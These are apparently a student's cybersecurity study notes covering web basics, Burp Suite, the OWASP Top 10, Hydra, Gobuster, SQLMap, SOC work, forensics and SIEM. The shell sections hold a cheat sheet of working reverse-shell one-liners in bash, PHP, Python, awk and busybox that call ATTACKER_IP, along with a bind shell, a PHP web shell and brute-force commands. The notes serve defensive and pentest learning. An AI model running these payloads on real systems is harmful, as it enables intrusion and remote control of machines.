+ Referrer-Policy - controls the amount of information sent to the destination web server when a user is redirected from a source web server (e.g. through hyperlink); e.g. Referrer-Policy: no-referrer, Referrer-Policy: same-origin, Referrer-Policy: strict-origin, Referrer-Policy: strict-origin-when-cross-origin

Note: you can use [securityheaders.com](https://securityheaders.io/) to analyse the security headers of any website

### HTML Injection
*HTML Injection* is a vulnerability that occurs when unfiltered user input is displayed on the page. If a website does not sanitise user input (i.e. filter malicious text input), users can submit HTML or JavaScript code, allowing them to control the page's appearance and functionality.

*Input sanitation* is a means to protect a website secure. 

## JavaScript
*JavaScript (JS)* is a scripting language that adds interactive features to websites containing HTML and CSS (e.g. validation, onClick actions, animations, etc). 

JS is an interpreted language, which means the code is executed directly in a browser without prior compilation.

### Variables
There are three ways to declare variables in JS:
+ **var** - function-scoped
+ **let** - block-scoped
+ **const** - block-scoped

### Data Types
Data types include **string**, **number**, **boolean**, **null**, and **object** (i.e. complex data).

### Functions
Functions are designed to perform a specific task. This allows reuse of code, rather than rewriting them.

```
function PrintResult(rollNum) {
            alert("Username with roll number " + rollNum + " has passed the exam");
            // any other logic to display the result
        }
```

### Loops
Loops allow execution of a code block multiple times as long as a condition is true. These include **for**, **while**, and **do..while**. 

```
for (let i = 0; i < 100; i++) {
            PrintResult(rollNumbers[i]); // this will be called 100 times 
        }
```

### Conditional Statements
Control flow basically means deciding the order in which code blocks are executed based on certain conditions. Structures such as **if-else** and **switch** can be used.

```
age = prompt("What is your age")
        if (age >= 18) {
            document.getElementById("message").innerHTML = "You are an adult.";
        } else {
            document.getElementById("message").innerHTML = "You are a minor.";
        }
```

### Internal JS
Internal JS means embedding the JS code directly within an HTML document. The script is inserted between **<script** tags. These can be placed inside the <head> section for scripts that need to be loaded before page content is rendered or inside the <body> section for scripts that interact with elements as they are loaded.

```
 <!DOCTYPE html>
<html lang="en">
<head>
    <title>Internal JS</title>
</head>
<body>
    <h1>Addition of Two Numbers</h1>
    <p id="result"></p>

    <script>
        let x = 5;
        let y = 10;
        let result = x + y;
        document.getElementById("result").innerHTML = "The result is: " + result;
    </script>
</body>
</html>
```

### External JS
External JS uses JS code found in a separate .js file. This helps keep HTML document clean and organised. The .js file can be stored or hosted on the same web server (i.e. same as the HTML doc) or stored on an external web server (i.e. the cloud).

```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>External JS</title>
</head>
<body>
    <h1>Addition of Two Numbers</h1>
    <p id="result"></p>

    <!-- Link to the external JS file -->
    <script src="script.js"></script>
</body>
</html>
```
Note: when pen-testing a web application, it is important to check whether internal or external JS is used; this can be done by using View Page Source

### Dialogue Functions
Dialogue boxes can be used to provide interaction with users and dynamically update content on web pages. Note: if not implemented securely, attackers may exploit these features to execute attacks (e.g. XSS).

Some build-in functions include: 

**alert** - displays a message in a dialogue box with an "OK" button; often used for information or warnings

```
alert("HelloTHM");
```

**prompt** - displays a dialogue box that asks users for input

```
name = prompt("What is your name?");
    alert("Hello " + name);
```

**confirm** - displays a dialogue box with a message and "OK" and "Cancel" buttons; this returns true or false based on the response
**prompt**, and **confirm**.

```
confirm("Do you want to proceed?")
```
### Minification & Obfuscation
Minification is the process of compressing JS files by removing spaces, line breaks, comments, and shortening variable names. This reduces the file size and improves web page loading times.

Obfuscation is used to make JS code harder to understand. This renamed variables and functions and even inserts dummy code.

Note: you can use [Code Beautify](https://codebeautify.org/javascript-obfuscator#) to obfuscate code; you can use [Deobfuscator](https://obf-io.deobfuscate.io/) to deobfuscate

### Best Practices
+ Avoid relying on client side validation only, as users can disable/manipulate JS; perform validation on the server side is essential
+ Refrain from adding untrusted libraries (e.g. src attribute in <script>)
+ Avoid hardcoded secrets into your JS code; these include API keys, access tokens, or credentials
+ Minify and obfuscate your JS code; this reduces size, improve load times, and make it harder for attackers to understand code

## SQL
*Structured Query Language (SQL)* is a programming language that can be used to query, define, and manipulate data stored in a relational database. We use these in popular Database Management Systems (DBMS) such as MySQL, MongoDB, Oracle DB, and Maria DB.

### Database Statements
Create Database
```
CREATE DATABASE database_name;
```
Show Database
```
SHOW DATABASES;
```
Use Database
```
USE database_name;
```
Drop Database
```
DROP DATABASE database_name;
```

### Table Statements
Create Table
```
CREATE TABLE example_table_name (
    example_column1 data_type,
    example_column2 data_type,
    example_column3 data_type
);
```
Show Tables
```
SHOW TABLES;
```
Describe Table
```
Describe table_name;
```
Alter Table
```
ALTER TABLE table_name
ADD example_column data_type;
```
Drop Table
```
DROP TABLE table_name;
```

### CRUD Operations
Create (INSERT) - adds new record to the table
```
INSERT INTO books (id, name, published_date, description)
    VALUES (1, "Android Security Internals", "2014-10-14", "An In-Depth Guide to Android's Security Architecture");
```
Read (SELECT) - retrieves record from the table
```
SELECT * FROM books;
```
Update (UPDATE) - modifies existing data in the table
```
UPDATE books
    SET description = "An In-Depth Guide to Android's Security Architecture."
    WHERE id = 1;
```
Delete (DELETE) - removes record from the table
```
DELETE FROM books WHERE id = 1;
```

### Clauses
Distinct
```
SELECT DISTINCT name FROM books;
```
Group by
```
SELECT name, COUNT(*)
    FROM books
    GROUP BY name;
```
Order by
```
SELECT *
    FROM books
    ORDER BY published_date ASC;
```
```
SELECT *
    FROM books
    ORDER BY published_date DESC;
```
Having
```
SELECT name, COUNT(*)
    FROM books
    GROUP BY name
    HAVING name LIKE '%Hack%';
```
### Logical Operators
Like
```
SELECT *
    FROM books
    WHERE description LIKE "%guide%";
```
And
```
SELECT *
    FROM books
    WHERE category = "Offensive Security" AND name = "Bug Bounty Bootcamp";
```
Or
```
SELECT *
    FROM books
    WHERE name LIKE "%Android%" OR name LIKE "%iOS%";
```
Not
```
SELECT *
    FROM books
    WHERE NOT description LIKE "%guide%";
```
Between
```
SELECT *
    FROM books
    WHERE id BETWEEN 2 AND 4;
```
### Comparison Operators
+ Equal-to (=)
+ Not-equal-to (!=)
+ Less-than (<)
+ Greater-than (>)
+ Less-than-equal-to (<=)
+ Greater-than-equal-to (>=)

### String Functions
CONCAT()
```
SELECT CONCAT(name, " is a type of ", category, " book.") AS book_info FROM books;
```
GROUP_CONCAT()
```
SELECT category, GROUP_CONCAT(name SEPARATOR ", ") AS books
    FROM books
    GROUP BY category;
```
SUBSTRING()
```
SELECT SUBSTRING(published_date, 1, 4) AS published_year FROM books;
```
LENGTH()
```
SELECT LENGTH(name) AS name_length FROM books;
```

### Aggregate Functions
COUNT()
```
SELECT COUNT(*) AS total_books FROM books;
```
SUM()
```
SELECT SUM(price) AS total_price FROM books;
```
MAX()
```
SELECT MAX(published_date) AS latest_book FROM books;
```
MIN()
```
SELECT MIN(published_date) AS earliest_book FROM books;
```

## Burp Suite
*Burp Suite* is a Java-based framework that provides solutions for web application testing. These days, it is an industry standard tool for hands-on security assessments of web and mobile applications (i.e. those that rely on APIs). In a nutshell, Burp Suite captures and enables manipulation of HTTP/HTTPS traffic between a browser and a web server. 

Note: Burp Suite Professional is the unrestricted version, while Burp Suite Community comes free; Burp Suite Enterprise is primarily used for continuous scanning

Though limited, Burp Suite Community provides key features such as:
+ Proxy - enables interception and modification of requests and responses with web applications
+ Repeater - allows capturing, modifying, and resending the same request multiple times; this is particularly useful when crafting payloads through trial and error (e.g. SQLi) or testing functionality of endpoints for vulnerabilities
+ Intruder - allows spraying endpoints with requests; commonly used for brute-force attacks or fuzzing endpoints
+ Decoder - offers data transformation; this can decode captured information or encode payloads before sending
+ Comparer - enables comparison of two pieces of data at either the word or byte level
+ Sequencer - employed for assessing the randomness of tokens (e.g. session cookie values, randomly generated data)

### Repeater Module
This module allows manipulation and repeated sending of captured requests. Manual creation of request from scratch (i.e. like cURL command) is also possible.


### Intruder Module
This module is a built-in fuzzing tool used for automated request modification and repeated testing with variations in input values. It is useful for brute-forcing login forms using wordlists or to test subdirectories, endpoints, and virtual hosts. It is similar to Wfuzz or ffuf.

Note: the Community Edition is rate limited, which makes other fuzzing and brute-forcing tools more viable

#### Attack Types
+ Sniper - effective for single-position attacks (e.g. password brute-force, fuzzing API endpoints); allows for precise testing and analysis of different payloads
+ Battering Ram - places the same payload in every position simultaneously; useful for testing same payloads against multiple positions without sequential substitution
+ Pitchfork - utilises one payload set per position and itereates through them simultaneously (i.e. multiple Sniper attacks); useful for conducting credential-stuffing attacks or for multiple positions requiring separate payload sets
+ Cluster Bomb - iterates through multiple payload sets individually, allowing for testing every possible combination; useful for credential brute-forcing when mapping between usernames and passwords is unknown

### Decoder Module
This module allows encoding and decoding functions, as well as create hashsums of data (i.e. similar to CyberChef).

Note: for hashing, it is customary to convert the hashed output into ASCII hex

### Comparer Module
This module compares two pieces of data, either by ASCII or by bytes. This is useful for situations where comparing two large pieces of data is needed (e.g. HTTP responses when brute-forcing credentials).

### Sequencer Module
This module evaluates for entropy (i.e. randomness) of tokens. These tokens can be session cookies or CSRF tokens used in form submissions. 

### Organiser Module
This module aids in storing and annotiating copies of HTTP requests. This is useful for organising penetration test workflows. Requests are stored in table format.

## OWASP Top 10 (2021)
### 1. Broken Access Control
Broken access control allows attackers to bypass authorisation, which gives them access to sensitive data or perform tasks they should not be able to. 

An example of this is *Insecure Direct Object Referencing (IDOR)*, which is an access control vulnerability where Direct Object References are exposed in a URL (e.g. https://bank.thm/account?id=111111). These objects can be files, users, account numbers, etc.

### 2. Cryptographic Failures
A cryptographic failure arises from the misuse/lack of cryptographic algorithms for protecting sensitive information (i.e. data in transit, data at rest). These result in the divulging of sensitive data linked to customers (e.g. names, DoBs, financial information, credentials).

These often lead to MitM SQLi attacks.

### 3. Injection
Injection flaws occur when an application interprets user input as commands/parameters. Examples of these include SQL (i.e. passing SQL queries) and command injections (i.e. passing system commands).

The main defence for preventing these attacks is ensuring that user input is not interpreted as queries/commands. These can be achieved by:
+ Using an allow list, where the input is compared to a list of safe inputs or characters; only input that is marked as safe is processed
+ Stripping input, where they are removed before processing if dangerous characters are detected

### 4. Insecure Design
Insecure design occur when an application's architecture is flawed. These can occur when an improper threat modelling is made during planning, which presents itself in the final version. An example of this is insecure password resets, where OTP can be brute-forced.

### 5. Security Misconfiguration
Security misconfigurations are related to keeping security configurations up-to-date. These include:
+ Poorly configured permissions on cloud services (e.g. S3 buckets)
+ Enabling unnecessary features (e.g. services, pages, privileges); an example is [Patreon hack](https://labs.detectify.com/writeups/how-patreon-got-hacked-publicly-exposed-werkzeug-debugger/), where a debugging interface was kept active
+ Default accounts with default passwords
+ Error messages that are overly detailed
+ Not using HTTP security headers

These often lead to more vulnerabilities such as weak credentials, XML or command injections.

### 6. Vulnerable & Outdated Components
You may find that a application is vulnerable to a well-known exploit. In such cases, ready-to-use exploits can be found online (i.e. [Exploit-DB](https://www.exploit-db.com/exploits/41962).

### 7. Identification & Authentication Failures
Flaws in authentication mechanisms allows attackers to gain access to users' accounts and sensitive data. Some common flaws include:
+ Brute force attacks; can be avoided by using a strong password policy
+ Use of weak credentials; can be avoided by enforcing automatic lockouts after a number of attempts
+ Weak session cookies; can be avoided by using MFA

### 8. Software & Data Integrity Failures
These vulnerabilities are caused by the use of code/infrastructure without integrity checks. There are two types of vulnerabilities:
+ Software Integrity Failures 
+ Data Integrity Failures

An example of software integrity can be seen in the use of code libraries. Inserting a library with a Subresource Integrity (SRI), which will be matched against the hash of the downloaded file.

```
<script src="https://code.jquery.com/jquery-3.6.1.min.js" integrity="sha256-o88AwQnZB+VDvE9tvIXrMQaPlFFSUTR+nldQm1LuPXQ=" crossorigin="anonymous"></script>
```

An example of data integrity can be seen in the use of cookies. Cookies can be tampered with (i.e. changing username), which can potentially lead to impersonation. A solution to this was the use of JSON Web Tokens (JWT), which allow key-value pairs (i.e. header-payload-signature) that the server matches with its own secret key.

### 9. Security Logging & Monitoring Failures
Logging is crucial as it allows tracing of activities. Attackers' actions can be traced, which can then be evaluated for risk and impact. 

The information in logs should include:
+ HTTP status codes
+ Time stamps
+ Usernames
+ API endpoints/page locations
+ IP addresses

### 10. Server-seide Request Forgery (SSRF)
SSRF vulnerabilities allow attackers to coerce a web application into sending requests on their behalf to arbitrary destinations while controling the contents of the requests itself. These arise from the use of third-party services.

Take for example: https://www.mysite.com/sms?server=attacker.thm&msg=ABC

Changing the server parameter to your own server can allow you to obtain the API key (i.e. by listening using Netcat).

SSRF can be used further to:
+ Enumerate internal networks (i.e. IP addresses and ports)
+ Abuse trust relationships between servers and gain unrestricted access to services
+ Interact with non-HTTP services (i.e. to get RCE)

## Hydra
*Hydra* is a brute force password cracking program tool. This can be used to run through a password list and crack some authentication services (e.g. SSH, web app form, FTP, SNMP). 

### Commands
Hydra commands follow the following syntax:

**hydra -l [user] -P [passlist.txt] [MACHINE_IP] [SERVICE]**

Example SSH

**hydra -l [user] -P [wordlist] [IP_address] -t [x] ssh**

| Option | Description |
| :------: | :-----: |
| -l [USERNAME] | specifies the username for login |
| -P [FILE_PATH] | indicates a list of passwords |
| -t [NUM] | sets the number of threads to spawn |
| -s [PORT_NUM] | sets the number of threads to spawn |

Example Post Web Form

**hydra -l [username] -P [wordlist] [IP_address] http-post-form "[path]:[login_credentials]:[invalid_response]"**

| Option | Description |
| :------: | :-----: |
| -l | specifies the username for login |
| -P | indicates a list of passwords |
| http-post-form | type of the form |
| [path] | login page of the URL (e.g. login.php) |
| [login_credentials] | username and password to use (e.g. username=^USER^&password=^PASS^) |
| [invalid_response] | part of the response when login fails |
| -V | verbose output for each attempt |

E.g. hydra -l [username] -P [wordlist] [IP_address] http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V

## Gobuster
*Gobuster* is a reconaissance tool that can be used to enumerate web directories, DNS subdomains, virtual hosts, S3 buckets, and Google Cloud Storage. This utilises brute force using specific wordlists. 

Basic syntax: **gobuster [command] [flags]**

Some commonly used flags include:
| Short Flag | Long Flag | Description |
| :------: | :-----: | :-----: |
| -t | --threads | configures number of threads used |
| -w | --wordlist | configures wordlist to be used |
|  | --delay | defines waiting time between sent requests |
|  | --debug | used for troubleshooting errors |
| -o | --output | writes results to a file |

E.g. gobuster dir -u "http://www.example.thm/" -w /usr/share/wordlists/dirb/small.txt -t 64

### Directory & File Enumeration
Basic syntax: **gobuster dir -d "[http://url]" -w [path_to_wordlist] [flags]**

Some commonly used flags include:
| Short Flag | Long Flag | Description |
| :------: | :-----: | :-----: |
| -c | --cookies | configures a cookie to pass (e.g. session ID) |
| -x | --extensions | specifies a file extension (e.g. .php, .js) |
| -H | --headers | configures an entire header to pass |
| -k | --no-tls-validation | skips certificate checking (i.e. used in CTF events only) |
| -n | --no-status | do not display status codes |
| -P | --password | set with --username for authentication |
| -U | --username | set with --password for authentication |
| -r | --followredirect | follow redirect to a different URL (i.e. 301, 302) |

E.g. gobuster dir -u "http://www.example.thm" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.js

Note: notice that " " are used when using the -u flag

### Subdomain Enumeration
Basic syntax: **gobuster dns -d [domain] -w [path_to_wordlist] [flags]**

Some commonly used flags include:
| Short Flag | Long Flag | Description |
| :------: | :-----: | :-----: |
| -c | --show-cname | display CNAME records |
| -i | --show-ips | displys IP addresses |
| -r | --resolver | configures a custom DNS to use |
| -d | --domain | configures the domain to be enumerated |

### Vhost Enumeration
Basic syntax: **gobuster vhost -u "[http://url] -w [path_to_wordlist] [flags]**

Note: vhost commands are much more complex as more configured flags are used to reflect realistic tests

Some commonly used flags include:
| Short Flag | Long Flag | Description |
| :------: | :-----: | :-----: |
|  | --domain | sets top and second-level domains |
|  | --append-domain | appends the configured domain to each wordlist entry |
|  | --exclude-length | filters responses by size |

E.g. gobuster vhost -u "http://10.10.31.174" --domain example.thm -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain --exclude-length 250-320 

## Shells
*Shells* allow users to interact with an OS, usually through a CLI. Attackers use these shells on compromised systems to do execute several activities, which include:
+ Remote system control
+ Privilege escalation
+ Data exfiltration
+ Persistence and maintenance access
+ Post-exploitation
+ Access other systems on the network (i.e. pivoting)

### Reverse Shell
Reverse shells or "connect back shells" initiate a connection from the target system to the attacker's machine, which aids in avoiding detection from network firewalls and other security measures.

The process typically is as follows:

1 - Set up a listener using Netcat 

E.g. nc listener
```
nc -lvnp 443
```
Any port can be used to wait for a connection. Note: known ports (e.g. 53, 80, 8080, 443, 139, 445) tend to be used to blend with legitimate traffic

2- Gaining reverse shell access

Once a listener is set, a rever shell payload is executed. This abuses the vulnerability/unauthorised access granted and executes a command that will expose the shell through the network. [Pentest Monkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) have some examples.

E.g. Pipe rever shell
```
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc [ATTACKER_IP] [ATTACKER_PORT] >/tmp/f
```

3- Attacker receives shell

Once received, the attacker can execute commands as if they were logging into a regular terminal

### Bind Shell
Bind shells will bind a port on the compromised system and listen for incoming connections. When a connection is made, it exposes a shell session. This method can be used when the compromised target does not allow outgoing connections. Note: this tends to be less popular since it needs to remain active, which increases the chances of detection.

The process typically is as follows:

1- Setting up the bind shell on the target
```
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f
```
Once the command is executed, it will wait for an incoming connection.

2- Attacker connects to the bind shell

As the target waits for incoming ocnnections, attackers can use Netcat to connect.
```
nc -nv [TARGET_IP] 8080
```

After connection, a shell is obtained and commands can be executed.

### Web Shells
Web shells are scripts written in a language supported by a compromised web server, which can execute commands through the web server itself. These are usually files containing the code that executes that can be hidden in a compromised web app or service. These can be written in PHP, ASP, JSP, and CGI scripts.

1- Upload web shell file to web server

E.g. simple PHP web shell
```
<?php
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
```

The above shell can be saved in to a file (e.g. shell.php) and then uploaded into the web server that is vulnerable to unrestricted file upload, file inclusion, command injections, etc.

2- Access the shell through URL

Once deployed, the file can be accessed through the URL where the web shell is hoted (e.g. http://victim.com/uploads/shell.php). 

3- Execute commands

For the above example, GET methods and the value of cmd need to be provided (e.g. http://victim.com/uploads/shell.php?cmd=whoami).

Note: there are many popular web shells that can be found online, including:
+ [p0wny-shell](https://github.com/flozz/p0wny-shell)
+ [b374k shell](https://github.com/b374k/b374k)
+ [c99 shell](https://www.r57shell.net/single.php?id=13)

Other can be found on [r57shell.net](https://www.r57shell.net/index.php).

### Other Shell Listeners
Other tools that can be used as listeners include:

*Rlwrap* - provides editing keyboard and history; wrapping **nc** with **rlwrap** allows the use of arrow keys and history for better interaction

```
rlwrap nc -lvnp 443
```

*Ncat* - improved version of Netcat; provides extra features such as encryption (i.e. SSL)

```
ncat --ssl -lvnp 4444
```

*Socat* - allows creation of socket connections between two data sources (e.g. two hosts)

```
socat -d -d TCP-LISTEN:443 STDOUT
```

## Shell Payloads
Shell payloads can be commands or scripts that exposes the shell into incoming connections (i.e. bind shell) or send a connection (i.e. reverse shell).

### Bash
E.g. Normal bash reverse shell
```
bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1
```
E.g. Bash read line reverse shell
```
exec 5<>/dev/tcp/ATTACKER_IP/443; cat <&5 | while read line; do $line 2>&5 >&5; done
```
E.g. Bash with file descripter 196 reverse shell
```
0<&196;exec 196<>/dev/tcp/ATTACKER_IP/443; sh <&196 >&196 2>&196
```
E.g. Bash with file descripter 5 reverse shell
```
bash -i 5<> /dev/tcp/ATTACKER_IP/443 0<&5 1>&5 2>&5
```

### PHP
E.g. PHP reverse shell using the exec function
```
php -r '$sock=fsockopen("ATTACKER_IP",443);exec("sh <&3 >&3 2>&3");'
```
E.g. PHP reverse shell using the shell_exec function
```
php -r '$sock=fsockopen("ATTACKER_IP",443);shell_exec("sh <&3 >&3 2>&3");'
```
E.g. PHP reverse shell using the system function
```
php -r '$sock=fsockopen("ATTACKER_IP",443);system("sh <&3 >&3 2>&3");'
```
E.g. PHP reverse shell using the passthru function
```
php -r '$sock=fsockopen("ATTACKER_IP",443);passthru("sh <&3 >&3 2>&3");'
```
E.g. PHP reverse shell using the popen function
```
php -r '$sock=fsockopen("ATTACKER_IP",443);popen("sh <&3 >&3 2>&3", "r");'
```

### Python
E.g. Python reverse shell by exporting environmental variables
```
export RHOST="ATTACKER_IP"; export RPORT=443; python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'
```
E.g. Python reverse shell using the subprocess module
```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.4.99.209",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'
```
E.g. Short Python reverse shell
```
python -c 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER_IP",443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'
```

### Others
E.g. Telnet
```
TF=$(mktemp -u); mkfifo $TF && telnet ATTACKER_IP443 0<$TF | sh 1>$TF
```
E.g. AWK
```
awk 'BEGIN {s = "/inet/tcp/0/ATTACKER_IP/443"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```
E.g. BusyBox
```
busybox nc ATTACKER_IP 443 -e sh
```

## SQLMap
*SQLMap* is an automated tool for detecting and exploiting SQLi vulnerabilities in web apps. 

Basic syntax: **sqlmap -u [GET_URL] [flags]**

Note: GET URLs can be taken from Developer Tools -> Network after sending a sample POST request; add ' ' to URLs to handle special characters (e.g. ?)

Some key information flags to take note of:
+ **--help** - lists all available flags
+ **--wizard** - step-by-step guide to complete a particular scan; useful for beginners

Main SQLi flags include:
+ **--dbs** - extract all database names
+ **-D [database_name]** - select a specific database
+ **--tables** - extract all tables from a database
+ **-T [table_name]** - select a specific table
+ **--dump** - extract all records

E.g. sqlmap -u 'http://sqlmaptesting.thmsearch/cat=1' -D users -T thomas --dump

## SOC
A *Security Operations Center (SOC)* is a specialised security facility that monitors an organisation's network and resources and identify suspicious activity. Their main focus is to keep detection and response robust

Detection can be in relation to: vulnerabilities, unauthorised activity, policy violations, intrusions. Support often occurs in conjunction with incident response once an incident is detected.

The three pillars of a SOC include: 
+ People (i.e. the SOC team)
+ Process (i.e. alert triage - the 5 Ws, reporting, incident response and forensics)
+ Technology (SIEM, EDR, firewalls, etc)

## Digital Forensics
*Digital forensics* primarily involve the use of tools and techniques to investigate digital devices to find and analyse evidence for necessary legal action.

### Methodology
The National Institute of Standards and Technology (NIST) introduced four phases for the process of digital forensics. These are:

Collection -> Examination -> Analysis -> Reporting

Note: there are different types of forensics that each have their own collection and analysis methodologies. These include:
+ Computer forensics - primarily investigating computers
+ Mobile forensics - involves investigating mobile devices (i.e. call records, text messages, GPS locations, etc)
+ Network forensics - covers investigation that includes the whole network (i.e. network traffic logs)
+ Database forensics - investigates intrusions into databases (i.e. data modification/exfiltration)
+ Cloud forensics - involve investigating data stored in cloud infrastructure
+ Email forensics - involve investigating this communication method (i.e. phishing, fraud campaigns)

### Notes on Acquiring Evidence
Some general practices to follow while acquiring evidence include:
+ Proper Authorisation - evidence collected without prior approval may be deemed inadmissible in court; the forensics team should obtain authorisation from relevant authorities before collecting any data
+ Chain of Custody - this formal document contains all details of the evidence; this document can be used to prove the integrity and reliability of th evidence in court
+ Write Blockers - using these tools can block any evidence alteration actions

### Notes on Windows Forensics
As part of the data collection phase, forensic images of Windows OS are taken. There are two categories:
+ Disk image - contains all data present on the storage device (i.e. HDD, SSD, etc); data is non-volatile (i.e. remains after restart)
+ Memory image - contains data in RAM; data is volatile (i.e. lost after restart)

Some tools for disk and memory image acquisition and analysis include:
+ FTK Imager - widely used for creating disk images
+ [Autopsy](https://www.autopsy.com/) - imported disk images can be analysed; features include keyword search, deleted file recovery, file metadata, extension mismatch detection, etc
+ [Dumpit](https://www.toolwar.com/2014/01/dumpit-memory-dump-tools.html) - creates memory images using CLI
+ [Volatility](https://volatilityfoundation.org/) - open-source tool for analysing memory images; this supports Windows, Linux, macOS, and Android

### Notes on File Metadata
Text files contain metadata. These include exported pdf files. To read the metadata, **pdfinfo** can be used. The extracted metadata include title, subject, author, creator, and creation date.

Basic syntax: **pdfinfo [document.pdf]**

Image files have Exchangeable Image File Format (EXIF) metadata. These can include data on camera/smartphone model, date and time of capture, GPS coordinates (i.e. for smartphones) photo settings such as focal length, aperture, shutter speed, and ISO. The program **exiftool** can be used to read and write metadata in images.

Basic syntax: **exiftool [image.jpg]**

## Incident Response
*Incident response (IR)* handles incidents from start to end. Incidents are true positive alerts, which are given a severity level. These can be categorised into different types:
+ Malware infections
+ Security breaches (i.e. unauthorised access)
+ Data leaks
+ Insider attacks
+ DoS attacks

### IR Process
Two widely used incident response frameworks are used: SANS and NIST.

The SANS framework has six phases, known as PICERL:
1. Preparation
2. Identification
3. Containment
4. Eradication
5. Recovery
6. Lessons Learned

The NIST framework has four phases:
1. Preparation
2. Detection and Analysis
3. Containment, Eradication, and Recovery
4. Post-Incident Activity

Each of these process has a formal document listing all relevant organisational procedures called an *incident response plan*. Key components of this plan include:
+ Roles and responsibilities
+ Incident response methodology
+ Communication plan with stakeholders
+ Escalation path to be followed

### IR Techniques
Multiple security solutions can aid in the various phases of the IR process (i.e. identification, containment, detection and analysis). These include:
+ SIEM - collects all important logs in one centralised location and correlates them to identify incidents
+ AV - detects known malicious programs in a system and scans the system for them
+ EDR - deployed on every system to contain and eradicate advanced-level threats

After identification, certain procedures must be followed. The following can be used for different kinds of incidents:
+ *Playbooks* - guidelines for a comprehensive incident response
+ *Runbooks* - detailed step-by-step methodology during incidents

## Logs
*Logs* are digital footprints left behind by activities, whether they are intended or malicious. These play an important role in the following areas:
+ Security Events Monitoring - detecting anomalous behaviour in real-time
+ Incident Investigation and Forensics - offers detailed information and traces to the root cause of incidents
+ Troubleshooting - documents errors in systems/applications for diagnosis and fixing
+ Performance Monitoring - provide insights into application performance
+ Auditing and Compliance - establishes a trail for activities

Logs can be grouped into multiple categories, depending on their information. These include:
| Log Type | Usage | Examples |
| :------: | :-----: | :-----: |
| System Logs | used in troubleshooting OS issues | System Startup, Driver Loading, System Error, Hardware events |
| Security Logs | detect and investigate security-related activities | Authentication, Authorisation, Security Policy changes, User Account changes events |
| Application Logs | records application-specific events | User Interaction, Application Changes, Application Update, Application Error events |
| Audit Logs | provides information on system changes and user events | Data Access, System Change, User Activity, Policy Enforcement events |
| Network Logs | details outgoing and incoming network traffic | Incoming/Outgoing Network Traffic, Firewall logs |
| Access Logs | details information about access to different resources | Webserver Access, Database Access, Application Access, API Access logs |

### E.g. Windows Event Logs
In Windows systems, *Event Viewer* provides a GUI tool to view and search for logs. These logs typically include these fields:
+ Description
+ Log Name
+ Logged
+ Event ID

Event IDs can be used to search for a specific activity. Refer to the table below for some important IDs:
| Event ID | Description |
| :------: | :-----: |
| 4624 | Sucessful log in byuser |
| 4625 | Failed login by user |
| 4634 | Sucessful logout by user |
| 4720 | User account created |
| 4724 | Attempted password reset |
| 4722 | User account enabled |
| 4725 | User account disabled |
| 4726 | User account deleted |

Note: these event IDs can be used for filtering logs

### E.g. Linux Webserver Access Logs
These kinds of logs contain all requests made to the website. Information such as timeframe, IP requested, type, and URL are included. These can be found in the directory: */var/log/apache2/access.log*

Some manual analysis commands:
+ **cat [file.log]**
+ **cat [file1.log] [file2.log] > [combined.log]**
+ **grep "[search_keyword]" [file.log]**
+ **less [file.log]** - separates log file into chunks (i.e. page at a time); use spacebar to move to next page, b to previous page; type / then pattern to search; use n to navigate to next occurence of search, N to navigate to the previous occurrence

## SIEM
*Security Information and Event Management System (SIEM)* is a tool that collects data from various endpoints across the network to a centralised location and performs correlation.

SIEMs have the advantage of taking these logs from various sources but also provides an abilityo to correlate between events, search through logs, investigate incidents, and respond appropriately. Some key features include:
+ Real-time log ingestion
+ Alerting on anomalous activities
+ 24/7 monitoring and visibility
+ Threat protection through early detection
+ Data insights and visualisation
+ Investigate past incidents

### Log Sources
Remember that there are different types of log sources
+ Host-Centric Log Sources - capture events that occurred within or related to a host (e.g. Windows Event logs, Sysmon, Osquery, etc)
+ Network-Centric Log Sources - generated when hosts communicate with each other or through the internet (e.g. SSH, VPN, HTTP/s, FTP, etc)

For Windows, *Event Viewer* is the main tool where different logs are stored and viewed. These logs are forwarded to the SIEM for better monitoring and visibility.

For Linux, common locations for log storage include:
+ */var/log/httpd* - contains HTTP request/reponse and error logs
+ */var/log/apache* - contains apache related logs
+ */var/log/cron* - stores cron jobs events
+ */var/log/auth.log* and */var/log/secure* - stores authentication logs
+ */var/log/kern* - stores kernel related events

### Log Ingestion
Each SIEM has its own way of ingesting logs. Common methods include:
+ Agent/Forwader - a tool by Splunk that is installed in the endpoint that configures them to capture all important logs and send them to the SIEM server
+ Syslog - protocol to collect data from various systems (e.g. webservers, databases) and sent in real-time to a centralised destination
+ Manual Upload - some solutions (i.e. Splunk, ELK) allow offline data ingestion
+ Port-Forwarding - listens on a certain port, and endpoints forward the data to the SIEM on the listening port

### Log & Alert Analysis
Dashboards are the most important components of the SIEM as they present data for analysis after normalisation and ingestion. Some information that are summarised include:
+ Alert highlights
+ System notifications
+ Health alerts
+ List of failed login attempts
+ Events ingested count
+ Rules triggered
+ Top domains visited

Correlation rules are logical expressions that are set to be triggered if met. These allow timely detection of threats. Some examples include:
+ If the Log source is WinEventLog AND EventID is 104 - Trigger an alert Event Log Cleared
+ If Log Source is WinEventLog AND EventCode is 4688, and NewProcessName contains whoami, then Trigger an ALERT WHOAMI command Execution DETECTED

